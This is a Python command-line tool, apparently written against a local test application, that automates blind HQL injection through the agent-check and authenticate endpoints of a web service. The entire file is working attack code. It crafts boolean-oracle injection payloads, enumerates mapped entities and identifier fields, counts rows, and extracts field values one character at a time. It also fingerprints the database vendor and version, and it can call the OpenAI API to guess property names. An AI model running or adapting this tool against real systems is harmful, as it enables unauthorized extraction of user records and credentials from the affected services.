#!/usr/bin/env python3
import requests, urllib3, time, argparse, os, json, re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =======================
# CONFIG (edit these)
# =======================
CHECK_AGENT_URL = "http://127.0.0.1:8443/checkvalidagent"
AUTHENTICATE_URL = "http://127.0.0.1:8443/authenticate"
VERIFY_TLS = False
PROXY = {}  # disabled by default; set via --proxy <url>
HEADERS = {}  # extra headers if needed
REQUESTS_SENT = 0
LAST_MSG = ""
MISSING_FIELDS: set[str] = set()
COUNT_CACHE: dict[int, bool] = {}

# Phase 1: entityId discovery
TARGET_ENTITY_COUNT = 2
ENTITYID_MAXLEN = 8
ENTITYID_CHARSET = "0123456789"  # observed

# Phase 2: fields to try per entity
FIELDS = []
DEFAULT_MAXLEN = 80

# Phase 3: value brute charset
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- @:/()[]+,"
SLEEP_BETWEEN = 0.0  # throttle if needed

# Runtime flags
DEBUG = False
AI_MODE = False
AI_FIELD_COUNT = 10
ID_FIELD = None
TARGET = "AGENT"  # or AUTHENTICATE
AUTH_CALIBRATED = False
AUTH_NULL_IS_TRUE = True  # will be set during calibration


def _lower_camel(s: str) -> str:
    if not s:
        return s
    return s[0].lower() + s[1:]

def _sanitize_field_name(name: str):
    # keep only valid identifier-like names suitable for HQL property refs
    name = name.strip()
    # drop numbering like "1. field" or "- field" or quotes
    name = re.sub(r"^\s*[\d\-\.)]+\s*", "", name)
    name = name.strip("`\"' ")
    name = _lower_camel(name)
    if re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", name or ""):
        return name
    return None

def augment_fields_from_ai(entity_full_name: str, count: int):
    """Fetch up to `count` likely property names for the entity and extend FIELDS."""
    api_key = os.environ.get("OPENAI_API_KEY")
    if not api_key:
        print("[!] --ai-mode set but OPENAI_API_KEY not found in environment")
        raise SystemExit(2)

    entity_simple = entity_full_name.split(".")[-1]
    system_msg = "You are a concise assistant that outputs JSON only."
    user_msg = (
        f"Given the entity name, return a JSON array (max {count}) of likely property names "
        "for that entity as lowerCamelCase strings only. No explanations.\n"
        f"Entity full name: {entity_full_name}\n"
        f"Entity simple name: {entity_simple}"
    )

    url = "https://api.openai.com/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }
    payload = {
        "model": "gpt-4o-mini",
        "messages": [
            {"role": "system", "content": system_msg},
            {"role": "user", "content": user_msg},
        ],
        "temperature": 0.2,
        "max_tokens": 300,
    }

    try:
        # Do not use the app's proxy or TLS settings for OpenAI calls
        resp = requests.post(url, headers=headers, json=payload, timeout=30)
        if resp.status_code != 200:
            print(f"[ai] OpenAI API error: {resp.status_code} {resp.text[:200]}")
            return
        data = resp.json()
        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or "[]"
        suggestions: list[str] = []
        try:
            parsed = json.loads(content)
            if isinstance(parsed, list):
                suggestions = [str(x) for x in parsed][:count]
            else:
                suggestions = []
        except Exception:
            # Fallback: split by commas/newlines and clean
            raw_parts = re.split(r"[\n,]", content)
            suggestions = [p.strip() for p in raw_parts if p.strip()]

        cleaned: list[str] = []
        seen = set()
        for s in suggestions:
            nm = _sanitize_field_name(s)
            if not nm:
                continue
            if nm in seen:
                continue
            seen.add(nm)
            cleaned.append(nm)
            if len(cleaned) >= count:
                break

        if not cleaned:
            print("[ai] No usable suggestions parsed from AI response")
            return

        # Merge into FIELDS without duplicates, preserve existing order
        added = [f for f in cleaned if f not in FIELDS]
        if added:
            FIELDS.extend(added)
            print(f"[ai] added {len(added)} field(s): {added}")
        else:
            print("[ai] No new fields to add (all were already present)")
    except Exception as e:
        print(f"[ai] Failed to fetch suggestions: {e}")
        return

def augment_fields_from_file(path: str):
    """Read field names from a text file and extend FIELDS.

    - Accepts one name per line; lines may contain inline comments after '#'.
    - Also supports comma/whitespace separated lists per line.
    - Names are sanitized to identifier-like lowerCamelCase.
    """
    if not path:
        return
    if not os.path.isfile(path):
        print(f"[!] --fields file not found: {path}")
        raise SystemExit(2)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            raw = fh.read()
    except Exception as e:
        print(f"[!] Failed to read --fields file: {e}")
        raise SystemExit(2)

    tokens: list[str] = []
    for line in raw.splitlines():
        # strip comments
        line = line.split('#', 1)[0].strip()
        if not line:
            continue
        parts = [p.strip() for p in re.split(r"[\s,]+", line) if p.strip()]
        tokens.extend(parts)

    cleaned: list[str] = []
    seen = set()
    for t in tokens:
        nm = _sanitize_field_name(t)
        if not nm or nm in seen:
            continue
        seen.add(nm)
        cleaned.append(nm)

    if not cleaned:
        print("[fields] No usable field names found in file")
        return

    added = [f for f in cleaned if f not in FIELDS]
    if added:
        FIELDS.extend(added)
        print(f"[fields] added {len(added)} field(s) from file: {added}")
    else:
        print("[fields] No new fields to add from file (duplicates only)")

# =======================
# Core utils
# =======================
def esc(s: str) -> str:
    return s.replace("'", "''")

def inj(expr: str) -> str:
    # Boolean oracle wrapper
    # Use a non-existent base username so the oracle depends on expr:
    return f"x' or ({expr}) or '1'='2"

def exists(hql_bool: str) -> str:
    return f"exists ( from {HQL_ENTITY} u where {hql_bool} )"

# ---- HQL fragment builders (deduplicate string scaffolding) ----
def eq(prop: str, value: str) -> str:
    return f"u.{prop} = '{esc(value)}'"

def is_not_null(prop: str) -> str:
    return f"u.{prop} is not null"

def len_ge(prop: str, n: int) -> str:
    return f"length(u.{prop}) >= {n}"

def like_prefix(prop: str, prefix: str) -> str:
    return f"u.{prop} like '{esc(prefix)}%'"

def is_unknown_property_error(field: str) -> bool:
    """Return True if the last response message indicates an unknown/invalid property."""
    msg = LAST_MSG or ""
    if not msg:
        return False
    low = msg.lower()
    if field.lower() not in low:
        return False
    return (
        "unknownpathexception" in low
        or "could not resolve property" in low
        or "could not resolve attribute" in low
    )

def is_unknown_entity_error(entity_name: str) -> bool:
    """Return True if the last response message indicates an unknown/missing entity mapping."""
    msg = LAST_MSG or ""
    if not msg:
        return False
    low = msg.lower()
    # Include the entity token to reduce false positives
    if entity_name and entity_name.split(".")[-1].lower() not in low and entity_name.lower() not in low:
        # Sometimes only simple name appears; check both
        pass
    return (
        "unknownentityexception" in low
        or "could not resolve root entity" in low
        or "is not mapped" in low
    )

def _entity_simple_name() -> str:
    return (HQL_ENTITY.split(".")[-1] if HQL_ENTITY else "").strip()

def _id_candidates_base() -> list[str]:
    sn = _entity_simple_name()
    lc = sn[:1].lower() + sn[1:] if sn else sn
    guess = []
    if lc:
        guess.extend([f"{lc}Id", f"{lc}Code"])  # e.g., agentId, agentCode
    guess.extend([
        "userId", "agentId", "customerId", "clientId", "accountId", "policyId",
        "memberId", "employeeId", "username", "email", "code", "refId", "uid", "uuid", "guid",
        "altUserId",
        "id",  # HQL alias for identifier; keep last as fallback
    ])
    # Deduplicate preserving order
    seen = set()
    out = []
    for g in guess:
        if g not in seen:
            seen.add(g)
            out.append(g)
    return out

def _truthy_expr(expr: str):
    return truthy(inj(expr))

def _property_probe(prop: str) -> bool:
    """Probe if property name parses on server. Returns False if unknown property error seen, True otherwise."""
    # Use a tautology that references the property irrespective of null-ness
    _ = _truthy_expr(exists(f"u.{prop} is null or u.{prop} is not null"))
    return not is_unknown_property_error(prop)

def _prop_duplicates_exist(prop: str):
    # True means duplicates observed (not unique); False means likely unique or too few rows.
    expr = f"exists ( from {HQL_ENTITY} a, {HQL_ENTITY} b where a <> b and a.{prop} = b.{prop} )"
    return _truthy_expr(expr)

def _augment_id_candidates_from_ai(count: int = 5) -> list[str]:
    try:
        api_key = os.environ.get("OPENAI_API_KEY")
        if not api_key:
            return []
        entity_full_name = HQL_ENTITY
        entity_simple = _entity_simple_name()
        system_msg = "You output JSON only."
        user_msg = (
            f"Given an entity name, list up to {count} likely identifier property names as lowerCamelCase; "
            "examples: userId, agentId, id, uuid. No explanations.\n"
            f"Entity full name: {entity_full_name}\nEntity simple name: {entity_simple}"
        )
        url = "https://api.openai.com/v1/chat/completions"
        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
        payload = {
            "model": "gpt-4o-mini",
            "messages": [{"role": "system", "content": system_msg}, {"role": "user", "content": user_msg}],
            "temperature": 0.2,
            "max_tokens": 200,
        }
        resp = requests.post(url, headers=headers, json=payload, timeout=20)
        if resp.status_code != 200:
            return []
        data = resp.json()
        content = ((data.get("choices") or [{}])[0].get("message") or {}).get("content") or "[]"
        try:
            arr = json.loads(content)
            if isinstance(arr, list):
                raw = [str(x) for x in arr][:count]
            else:
                raw = []
        except Exception:
            raw = [p.strip() for p in re.split(r"[,\n]", content) if p.strip()]
        cleaned = []
        seen = set()
        for x in raw:
            nm = _sanitize_field_name(x)
            if nm and nm not in seen:
                seen.add(nm)
                cleaned.append(nm)
        return cleaned
    except Exception:
        return []

def _read_entities_file(path: str) -> list[str]:
    if not path or not os.path.isfile(path):
        print(f"[!] --entities file not found: {path}")
        raise SystemExit(2)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            raw = fh.read()
    except Exception as e:
        print(f"[!] Failed to read --entities file: {e}")
        raise SystemExit(2)
    cands: list[str] = []
    for line in raw.splitlines():
        line = line.split('#', 1)[0].strip()
        if not line:
            continue
        # accept tokens split by commas/whitespace
        parts = [p.strip() for p in re.split(r"[\s,]+", line) if p.strip()]
        for p in parts:
            # minimal sanitization: A-Za-z0-9 . _
            if re.match(r"^[A-Za-z0-9_.]+$", p):
                cands.append(p)
    # dedupe preserving order
    seen = set(); out = []
    for c in cands:
        if c not in seen:
            seen.add(c); out.append(c)
    return out

def resolve_entities(candidates: list[str]) -> list[str]:
    if not candidates:
        print("[i] No entity candidates to resolve")
        return []
    resolved: list[str] = []
    for ent in candidates:
        # Probe by referencing the entity in a subquery; result truth value isn't important
        _ = truthy(inj(f"exists ( from {ent} u where 1=1 )"))
        if is_unknown_entity_error(ent):
            print(f"[-] not mapped: {ent}")
        else:
            print(f"[+] mapped: {ent}")
            resolved.append(ent)
    print(f"[done] mapped entities: {resolved}")
    return resolved

def discover_id_field(cli_override = None) -> str:
    global ID_FIELD
    if cli_override:
        ID_FIELD = cli_override
        print(f"[*] id field (cli): {ID_FIELD}")
        return ID_FIELD
    candidates = _id_candidates_base()
    if AI_MODE:
        ai_sugs = _augment_id_candidates_from_ai(5)
        # Prepend AI suggestions (higher priority), but keep order stable
        candidates = [*ai_sugs, *[c for c in candidates if c not in ai_sugs]]
    viable: list[str] = []
    for c in candidates:
        if _property_probe(c):
            viable.append(c)
    # Prefer unique-looking properties
    chosen = None
    for c in viable:
        d = _prop_duplicates_exist(c)
        if d is False:  # no duplicates observed
            chosen = c
            break
    if not chosen and viable:
        chosen = viable[0]
    if not chosen:
        # Fallback to HQL alias 'id'
        chosen = "id"
    ID_FIELD = chosen
    print(f"[*] id field: {ID_FIELD}")
    return ID_FIELD

def do_request(agent: str):
    if TARGET == "AUTHENTICATE":
        # Server expects an AuthenticateRequest envelope: { header: {}, payload: { userName, password } }
        body = {
            "header": {},
            "payload": {
                "userName": agent,
                "password": "x",
            },
        }
        r = requests.post(
            AUTHENTICATE_URL,
            json=body,
            headers=HEADERS,
            timeout=20,
            verify=VERIFY_TLS,
            proxies=PROXY,
        )
    else:
        params = {"agentCode": agent}
        r = requests.get(
            CHECK_AGENT_URL,
            params=params,
            headers=HEADERS,
            timeout=20,
            verify=VERIFY_TLS,
            proxies=PROXY,
        )
    global REQUESTS_SENT, LAST_MSG
    REQUESTS_SENT += 1
    try:
        j = r.json()
    except Exception:
        print(f"[!] Non-JSON response: {r.status_code} {r.text}")
        return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    msg = mi.get("message") or ""
    LAST_MSG = msg
    if DEBUG:
        print(f"[req] agentCode={agent!r} -> statusCode={sc}, message={msg}")
    if SLEEP_BETWEEN:
        time.sleep(SLEEP_BETWEEN)
    return j

def _auth_calibrate_oracle():
    """Calibrate AUTHENTICATE oracle by sending two simple payloads and learning
    whether a null message corresponds to True or False.
    Uses non-existent base 'x'. Does not rely on entity rows.
    """
    global AUTH_CALIBRATED, AUTH_NULL_IS_TRUE
    if TARGET != "AUTHENTICATE":
        AUTH_CALIBRATED = True
        return
    # Build two direct payloads without inj(): true-like and false-like
    true_probe = "x' or '1'='1"
    false_probe = "x' or '1'='2"
    # Send requests
    j1 = do_request(true_probe) or {}
    mi1 = j1.get("msgInfo") or {}
    m1 = mi1.get("message")
    j2 = do_request(false_probe) or {}
    mi2 = j2.get("msgInfo") or {}
    m2 = mi2.get("message")
    # If message is None for '1'='1' and non-empty for '1'='2', then null means True
    if (m1 is None or m1 == "") and (m2 is not None and m2 != ""):
        AUTH_NULL_IS_TRUE = True
    # If reversed, set accordingly
    elif (m1 is not None and m1 != "") and (m2 is None or m2 == ""):
        AUTH_NULL_IS_TRUE = False
    # Else keep default (True) but mark calibrated
    AUTH_CALIBRATED = True

def truthy(agent: str):
    global AUTH_CALIBRATED
    if TARGET == "AUTHENTICATE" and not AUTH_CALIBRATED:
        _auth_calibrate_oracle()
    j = do_request(agent)
    if not j: return None
    mi = j.get("msgInfo") or {}
    sc = str(mi.get("statusCode") or "")
    msg = (mi.get("message") or "")
    payload = j.get("payload") or {}
    if TARGET == "AUTHENTICATE":
        # AUTH responses are 401 for both exist and not-exist; use message hints conservatively
        m = (msg or "").lower()
        if not msg:
            # message null/empty -> True or False depending on calibration
            return True if AUTH_NULL_IS_TRUE else False
        # Treat both "username or password is incorrect" and "username/password is incorrect" (and variants)
        if ("username" in m and "password" in m and "incorrect" in m):
            return False if AUTH_NULL_IS_TRUE else True
        if "syntaxexception" in m or "sqlgrammarexception" in m:
            # Indicates failed function/property probe
            return False
        # Fallback to status codes (rare)
        if sc == "400":
            return True
        if sc == "401":
            return None
    else:
        # AGENT endpoint behavior
        if sc == "400" or payload.get("statusMsg") == "Agent Already Registered":
            return True
        if sc == "401":
            return False
    return None

def oracle_ok() -> bool:
    t_false = truthy(inj(exists("1=0")))
    t_true  = truthy(inj(exists("1=1")))
    ok = (t_false is False and t_true is True)
    print("[*] probe:", "ok" if ok else "odd (continuing)")
    return ok

# =======================
# Phase 1: enumerate entityIds
# =======================
def prefix_is_entity(prefix: str, extra_where: str = "1=1"):
    field = ID_FIELD or "id"
    return truthy(inj(exists(f"{extra_where} and {like_prefix(field, prefix)}")))

def recover_one_entityid(extra_where: str = "1=1"):
    # ensure any row is visible under this filter
    if truthy(inj(exists(extra_where))) is not True:
        return None
    prefix = ""
    for pos in range(1, ENTITYID_MAXLEN + 1):
        advanced = False
        for c in ENTITYID_CHARSET:
            if prefix_is_entity(prefix + c, extra_where):
                prefix += c
                print(f"[id:{ID_FIELD or 'id'}] pos {pos:02d}: {prefix}")
                advanced = True
                break
        if not advanced:
            break
    return prefix if prefix else None

def enumerate_entityids(target_count: int) -> list[str]:
    found: list[str] = []
    extra = "1=1"
    while len(found) < target_count:
        uid = recover_one_entityid(extra_where=extra)
        if not uid:
            break
        print(f"[result] {ID_FIELD or 'id'}: {uid}")
        found.append(uid)
        # Exclude recovered IDs to get the next
        field = ID_FIELD or "id"
        not_equals = " and ".join([f"u.{field} <> '{esc(x)}'" for x in found])
        extra = f"({not_equals})"
    print(f"[done] recovered {len(found)} id(s): {found}")
    return found

# =======================
# Phase 2–3: fields & values
# =======================
def field_not_null(entity_id: str, field: str):
    idf = ID_FIELD or "id"
    where = f"{eq(idf, entity_id)} and {is_not_null(field)}"
    return truthy(inj(exists(where)))

def has_len_at_least(entity_id: str, field: str, n: int):
    idf = ID_FIELD or "id"
    where = f"{eq(idf, entity_id)} and {is_not_null(field)} and {len_ge(field, n)}"
    return truthy(inj(exists(where)))

def prefix_is(entity_id: str, field: str, prefix: str):
    idf = ID_FIELD or "id"
    where = f"{eq(idf, entity_id)} and {like_prefix(field, prefix)}"
    return truthy(inj(exists(where)))

def recover_field(entity_id: str, field: str, maxlen: int):
    # If we've already learned this field doesn't exist on the entity, skip globally
    if field in MISSING_FIELDS:
        if DEBUG:
            print(f"[i] skipping {field}: previously marked missing on {HQL_ENTITY}")
        return None
    present = field_not_null(entity_id, field)
    if present is not True:
        if is_unknown_property_error(field):
            MISSING_FIELDS.add(field)
            print(f"[i] disabling {field}: not a property on {HQL_ENTITY}; skipping for all entities")
            return None
        print(f"[i] {field} is null/absent for {entity_id}")
        return None

    # length bound
    length = 0
    for k in range(1, maxlen + 1):
        t = has_len_at_least(entity_id, field, k)
        if t is True:  length = k
        elif t is False: break
        else: break

    if length == 0:
        print(f"[i] {field} length=0 for {entity_id}")
        return ""

    # brute prefix
    val = ""
    for pos in range(1, length + 1):
        advanced = False
        for c in CHARSET:
            if prefix_is(entity_id, field, val + c):
                val += c
                print(f"[+] {entity_id} :: {field} pos {pos:02d}: {val!r}")
                advanced = True
                break
        if not advanced:
            print(f"[!] stalled at pos {pos} for {field} on {entity_id}; widen CHARSET")
            break
    return val

def discover_and_dump_fields(user_ids: list[str]):
    results = []
    for uid in user_ids:
        print(f"\n===== Enumerating fields for {ID_FIELD or 'id'} {uid} =====")
        for field in FIELDS:
            maxlen = DEFAULT_MAXLEN
            value = recover_field(uid, field, maxlen)
            if value is not None:
                print(f"[result] {uid} :: {field} = {repr(value)}")
                results.append((uid, field, value))
    print("\n=== OVERALL RESULTS ===")
    print(f"Total requests sent: {REQUESTS_SENT}")
    for uid, field, value in results:
        print(f"{uid} :: {field} = {repr(value)}")
    return results

# ==== BEGIN: DB detection helpers ====

def _probe(expr: str) -> bool :
    """Return True/False via boolean oracle using your injection mold; None if ambiguous."""
    return truthy(inj(expr))

def _like(expr: str, pattern: str) -> bool :
    return _probe(f"{expr} like '{esc(pattern)}'")

def _is_not_null(expr: str) -> bool :
    return _probe(f"{expr} is not null")

def _len_ge(expr: str, n: int) -> bool :
    # LENGTH works on strings in all target engines (vendor mapped)
    return _probe(f"function('length', {expr}) >= {n}")

def _fn_not_found() -> bool:
    """Heuristic: did the last response indicate an unknown database function?"""
    msg = (LAST_MSG or "").lower()
    if not msg:
        return False
    # Common vendor messages seen when a scalar function is unknown/invalid
    patterns = [
        "function does not exist",
        "does not exist",
        "not found",
        "unknown function",
        "no such function",
        "is not recognized as a function or procedure",
        "is not recognized as a built-in function name",
        "undefined function",
        "no function matches",
        "invalid identifier",  # oracle ora-00904 often summarized
    ]
    return any(p in msg for p in patterns)

def detect_db_vendor_and_version() -> tuple[str , str ]:
    """
    Attempts to detect DB vendor and a version string (when available via scalar function).
    Returns (vendor, version_string_or_None).
    """
    probes = [
        # (vendor, fingerprint_expr, version_expr, version_hint_fn)
        ("H2",
         "function('H2VERSION')",
         "function('H2VERSION')",
         None),

        ("SQLServer",
         "function('SERVERPROPERTY','ProductVersion')",
         "function('SERVERPROPERTY','ProductVersion')",
         None),

        ("Oracle",
         "function('SYS_CONTEXT','USERENV','DB_NAME')",   # no FROM needed
         None,  # no pure-scalar version in WHERE
         # Optional oracle-hint: presence of ORA_HASH implies >= 11g
         lambda: ">=11g" if _is_not_null("function('ORA_HASH','x')") else None),

        ("PostgreSQL",
         "function('current_setting','server_version')",
         "function('current_setting','server_version')",
         None),

        ("MySQL/MariaDB",
         "function('version')",   # present in both
         "function('version')",
         None),

        ("HSQLDB",
         "function('DATABASE_VERSION')",
         "function('DATABASE_VERSION')",
         None),

        ("Derby",
         "function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','derby.versionNumber')",
         "function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','derby.versionNumber')",
         None),

        ("SQLite",
         "function('sqlite_version')",
         "function('sqlite_version')",
         None),
    ]

    vendor = None
    version = None

    # If we know the entity and the outer table is empty, the boolean oracle in WHERE
    # cannot flip to true (count(*) stays 0). In that case, treat "no error" on a probe
    # as a positive vendor signal and skip version extraction.
    table_empty = None
    try:
        if HQL_ENTITY:
            table_empty = (truthy(inj(exists("1=1"))) is not True)
    except Exception:
        table_empty = None

    # First pass: function-based fingerprints (fast, low-cost when supported)
    eliminated = set()
    names_order = [p[0] for p in probes]
    for name, fp_expr, ver_expr, hint_fn in probes:
        ok = _is_not_null(fp_expr)
        if ok is True:
            vendor = name
            # Vendor-specific differentiation for MySQL vs MariaDB
            if name == "MySQL/MariaDB":
                maria = _like("function('version')", "%MariaDB%")
                if maria is True:
                    vendor = "MariaDB"
                elif maria is False:
                    vendor = "MySQL"
            # Attempt version extraction if we have an expression
            if ver_expr:
                # SQL Server: SERVERPROPERTY returns sql_variant; coerce to NVARCHAR via CONCAT for LEN/SUBSTRING
                if name == "SQLServer":
                    ver_expr = "function('CONCAT','', function('SERVERPROPERTY','ProductVersion'))"
                # Try to discover length and then dump a few leading chars via boolean probes
                # First: ensure non-empty
                if _len_ge(ver_expr, 1) is True:
                    # Recover up to 20 chars (sufficient for most banners) by brute over a safe charset
                    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- +()/"
                    v = ""
                    for pos in range(1, 21):
                        advanced = False
                        for c in charset:
                            # SUBSTRING is 1-based and named SUBSTRING in most dialects; route via function()
                            if _probe(f"function('substring',{ver_expr},{pos},1) = '{esc(c)}'") is True:
                                v += c
                                advanced = True
                                break
                        if not advanced:
                            # Stop at first non-match; likely end of string
                            break
                    version = v or None
            # Optional Oracle version hint (no FROM)
            if name == "Oracle" and hint_fn:
                hint = hint_fn()
                if hint and not version:
                    version = hint
            break
        else:
            # If function-not-found is clearly reported, it isn't this vendor.
            if _fn_not_found():
                eliminated.add(name)
                continue
            # If table is empty and the call did not error (message blank/benign), accept vendor.
            if table_empty is True and not _fn_not_found():
                vendor = name
                # We cannot reliably get a version without rows.
                version = None
                break

    # Second pass: elimination heuristic. If only one vendor didn't trigger a clear
    # function-not-found error, assume it's that vendor even if the boolean oracle
    # couldn't flip due to empty table or restrictive predicate evaluation.
    if not vendor:
        remaining = [n for n in names_order if n not in eliminated]
        if len(remaining) == 1:
            vendor = remaining[0]
            if vendor == "MySQL/MariaDB":
                maria = _like("function('version')", "%MariaDB%")
                if maria is True:
                    vendor = "MariaDB"
                elif maria is False:
                    vendor = "MySQL"

    # Fallback version extraction after vendor is known (even if found via elimination)
    if vendor and not version:
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- +()/"
        def _recover(ver_expr: str, maxlen: int = 32):
            if _len_ge(ver_expr, 1) is not True:
                return None
            v = ""
            for pos in range(1, maxlen + 1):
                advanced = False
                for ch in charset:
                    if _probe(f"function('substring',{ver_expr},{pos},1) = '{esc(ch)}'") is True:
                        v += ch
                        advanced = True
                        break
                if not advanced:
                    break
            return v or None

        if vendor == "SQLServer":
            expr = "function('CONCAT','', function('SERVERPROPERTY','ProductVersion'))"
            version = _recover(expr) or version
        elif vendor == "H2":
            version = _recover("function('H2VERSION')") or version
        elif vendor == "PostgreSQL":
            version = _recover("function('current_setting','server_version')") or version
        elif vendor in ("MySQL", "MariaDB", "MySQL/MariaDB"):
            version = _recover("function('version')") or version
        elif vendor == "HSQLDB":
            version = _recover("function('DATABASE_VERSION')") or version
        elif vendor == "SQLite":
            version = _recover("function('sqlite_version')") or version
        elif vendor == "Oracle":
            # No simple scalar version via WHERE; keep existing hint behavior
            pass
        elif vendor == "Derby":
            # Try several Derby property keys
            derby_props = [
                "derby.product.version",
                "derby.versionNumber",
                "derby.product.level",
                "DataDictionaryVersion",
            ]
            for key in derby_props:
                expr = f"function('SYSCS_UTIL.SYSCS_GET_DATABASE_PROPERTY','{key}')"
                v = _recover(expr)
                if v:
                    version = v
                    break

    return vendor, version

# ==== END: DB detection helpers ====


# =======================
# Main
# =======================
def main():
    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT, ID_FIELD, PROXY, TARGET
    parser = argparse.ArgumentParser(description="HQLi helper")
    parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
    parser.add_argument("--entity", help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
    parser.add_argument("--ai-mode", action="store_true", help="Use OpenAI to suggest extra fields (requires OPENAI_API_KEY)")
    parser.add_argument("--fields", help="Path to a wordlist file of field names to try (one per line)")
    parser.add_argument("--ai-field-count", type=int, default=10, help="How many fields to fetch from OpenAI when --ai-mode is enabled (default: 10)")
    parser.add_argument("--entity-count", type=int, default=2, help="Total number of entities to enumerate (default: 2)")
    parser.add_argument("--id-field", help="Override: name of the identifier property (e.g., userId, agentId). If omitted, the script tries to discover it.")
    parser.add_argument("--resolve-entities", action="store_true", help="Probe a wordlist of entity names and print those that are mapped")
    parser.add_argument("--entities", help="Path to a wordlist of entity names (simple or FQN) for --resolve-entities")
    parser.add_argument("--count-rows", action="store_true", help="Print total row count for --entity and exit")
    parser.add_argument("--detect-db", action="store_true", help="Detect database vendor and version via function() probes")
    parser.add_argument("--proxy", metavar="URL", help="Proxy URL for target requests; applied to both http and https. Example: http://127.0.0.1:8080")
    parser.add_argument("--target", choices=["AGENT","AUTHENTICATE"], default="AGENT", help="Target endpoint: AGENT (GET /checkvalidagent) or AUTHENTICATE (POST /authenticate). Default: AGENT")
    args = parser.parse_args()
    DEBUG = args.debug
    HQL_ENTITY = args.entity
    AI_MODE = args.ai_mode
    AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))
    TARGET_ENTITY_COUNT = max(1, int(args.entity_count or 2))
    PROXY = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
    TARGET = (args.target or "AGENT").upper()

    if args.detect_db:
        vndr, ver = detect_db_vendor_and_version()
        if not vndr:
            print("[detect-db] Unable to fingerprint vendor. Try a different endpoint, bypass WAF, or provide --entity for row presence hints.")
            return
        if ver:
            print(f"[detect-db] vendor={vndr}, version={ver}")
        else:
            print(f"[detect-db] vendor={vndr}, version=? (no scalar version in WHERE; try UNION/SELECT-list path)")
        return

    # Resolve-entities mode: enumerate mapped entities from wordlist and exit
    if args.resolve_entities:
        if not args.entities:
            print("[!] --resolve-entities requires --entities <file>")
            raise SystemExit(2)
        cands = _read_entities_file(args.entities)
        resolve_entities(cands)
        return

    # Normal mode checks
    if not HQL_ENTITY:
        print("[!] --entity is required unless --resolve-entities is used")
        raise SystemExit(2)

    # Count-only mode: compute and print total number of rows for the entity and exit
    if args.count_rows:
        def _ge(k: int):
            if k in COUNT_CACHE:
                return COUNT_CACHE[k]
            res = truthy(inj(f"(select count(*) from {HQL_ENTITY} u) >= {k}"))
            COUNT_CACHE[k] = res
            return res

        # Quick zero check
        t1 = _ge(1)
        if t1 is False:
            print(f"[count] {HQL_ENTITY} rows = 0")
            return
        if t1 is None:
            print("[count] ambiguous oracle response; cannot determine count")
            return
        # Exponential search to find upper bound
        low, high = 1, 1
        while True:
            t = _ge(high)
            if t is True:
                low = high
                high = min(high * 2, 1_000_000_000)
                if high == low:
                    break
                continue
            elif t is False:
                break
            else:
                print("[count] ambiguous oracle response during search; aborting")
                return
        # Binary search in (low, high]
        while low < high:
            mid = (low + high + 1) // 2
            t = _ge(mid)
            if t is True:
                low = mid
            elif t is False:
                high = mid - 1
            else:
                print("[count] ambiguous oracle response during refine; aborting")
                return
        print(f"[count] {HQL_ENTITY} rows = {low}")
        return

    if args.fields:
        augment_fields_from_file(args.fields)

    if AI_MODE:
        augment_fields_from_ai(HQL_ENTITY, AI_FIELD_COUNT)

    # Determine identifier field before oracle probes/enumeration
    discover_id_field(args.id_field)
    oracle_ok()
    entity_ids = enumerate_entityids(TARGET_ENTITY_COUNT)
    if not entity_ids:
        pass
    if entity_ids:
        discover_and_dump_fields(entity_ids)
    else:
        print("[i] No entityIds available for field enumeration")

if __name__ == "__main__":
    main()
